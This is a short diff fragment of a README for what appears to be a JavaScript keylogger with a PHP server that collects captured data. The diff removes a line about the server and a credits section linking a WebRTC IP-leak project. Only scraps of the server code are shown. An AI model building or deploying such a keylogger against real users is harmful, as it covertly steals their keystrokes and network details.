@@ -17,7 +17,6 @@ Usage example
 ```
 
 2.keylogger.js Server:
-you can make a server to accept ip and port:
 ```
 <?php
     date_default_timezone_set(PRC);
@@ -31,11 +30,4 @@ if(!empty($_GET['c'])) {
 ?>
 
 ```
-
-Credit
-------
-Repo is based on the following projects:
-
-- https://github.com/diafygi/webrtc-ips
-
 
